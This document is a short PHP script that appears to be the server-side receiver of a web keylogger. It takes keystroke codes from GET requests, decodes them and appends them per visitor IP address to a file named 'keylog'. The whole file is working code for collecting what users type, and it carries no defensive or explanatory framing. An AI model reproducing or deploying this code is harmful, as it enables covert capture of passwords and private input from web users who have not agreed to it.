<?php

$logfile = "keylog";

function addKeypress($ip, $key) {
	global $logfile;

	switch($key) {
		case 13: $key = "[ENTER]"; break;
		case 8: $key = "[BACKSPACE]"; break;
		default: $key = chr($key);
	}

	$content = file_get_contents($logfile);

	$lines = explode("\n", $content);
	$done = false;
	foreach ($lines as &$line) {
		$oldIp = explode(":", $line);
		$oldIp = $oldIp[0];
		if (isset($oldIp) && $oldIp == $ip) {
			$line .= $key;
			$done = true;
		}
	}
	if (!$done) {
		$lines[] = $ip.": ".$key;
	}

	file_put_contents($logfile, implode("\n", $lines));
}


$ip = $_SERVER['REMOTE_ADDR'];

if (isset($_GET["key"]) && is_numeric($_GET["key"])) {
	echo "..";
	$key = intval($_GET["key"]);
	addKeypress($ip, $key);
} 
?>
